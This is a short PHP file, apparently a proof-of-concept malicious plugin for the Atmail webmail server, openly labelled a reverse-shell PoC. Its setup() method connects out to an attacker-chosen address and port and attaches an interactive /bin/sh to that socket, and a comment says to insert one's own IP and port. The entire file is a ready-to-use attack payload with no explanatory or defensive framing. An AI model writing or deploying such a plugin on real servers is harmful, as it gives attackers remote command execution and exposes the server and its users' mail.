<?php

class poc_revshell_Plugin extends Atmail_Controller_Plugin
{

  protected $_pluginFullName = 'revshell';
  protected $_pluginDescription = '';
  protected $_pluginCopyright = 'Copyright Chad Chadlczyk';
  protected $_pluginUrl = 'http://shn.obi/pwned';
  protected $_pluginNotes = '';
  protected $_pluginVersion = '7.7.7';
  protected $_pluginCompat = '6.1.5';
  protected $_pluginModule = 'mail';
 
  public function __construct() {
    parent::__construct();
    $this->_pluginDescription = "Reverse Shell Plugin PoC";
  }   

  public function setup() {
    $sock=fsockopen('192.168.1.1',4444); //change the ip and the port for your machine
    $pr=proc_open('/bin/sh -i <&3 >&3 2>&3',array(3=>$sock),$pipes); 
    proc_close($pr);
  }

}

?>
